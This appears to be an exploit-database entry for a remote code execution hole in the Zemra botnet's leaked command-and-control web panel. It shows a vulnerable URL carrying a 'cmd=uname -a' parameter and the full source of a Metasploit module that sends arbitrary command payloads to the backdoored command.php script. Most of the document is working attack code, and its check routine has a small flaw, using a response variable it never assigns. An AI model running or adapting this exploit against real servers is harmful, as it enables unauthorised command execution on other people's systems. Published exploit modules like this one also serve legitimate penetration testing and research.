

Type: Remote Code Execution

Vuln: http://localhost/Zemra/Panel/Zemra/system/command.php?cmd=uname -a

Author: [shipcod3 / Jay Turla](https://twitter.com/shipcod3)

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Zemra Botnet CnC Web Panel Remote Code Execution',
      'Description'    => %q{
        This module exploits the CnC web panel of Zemra Botnet which contains a backdoor
        inside its leaked source code. Zemra is a crimeware bot that can be used to
        conduct DDoS attacks and is detected by Symantec as Backdoor.Zemra.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jay Turla <@shipcod3>', #Metasploit Module
          'Angel Injection', #Initial Discovery (PoC from Inj3ct0r Team)
          'Darren Martyn <@info_dox>' #Initial Discovery
        ],
      'References'     =>
        [
          ['URL', 'http://0day.today/exploit/19259'],
          ['URL', 'http://insecurety.net/?p=144'], #leaked source code and backdoor intro
          ['URL', 'http://www.symantec.com/connect/blogs/ddos-attacks-zemra-bot']
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 10000,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'Platform'       => %w{ unix win },
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['zemra panel / Unix', { 'Platform' => 'unix' } ],
          ['zemra panel / Windows', { 'Platform' => 'win' } ]
        ],
      'DisclosureDate' => 'Jun 28 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI',[true, "The path of the backdoor inside Zemra Botnet CnC Web Panel", "/Zemra/Panel/Zemra/system/command.php"]),
      ],self.class)
  end

  def check
    txt = Rex::Text.rand_text_alpha(8)
    http_send_command(txt)
    if res && res.body =~ /cmd/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s)
    res = send_request_cgi({
      'method'  => 'GET',
      'uri'             => uri,
      'vars_get'        =>
        {
          'cmd' => cmd
        }
    })
    unless res && res.code == 200
      fail_with(Failure::Unknown, 'Failed to execute the command.')
    end
    res
  end

  def exploit
    http_send_command(payload.encoded)
  end
end
```

**Reference:** https://www.rapid7.com/db/modules/exploit/multi/http/zemra_panel_rce
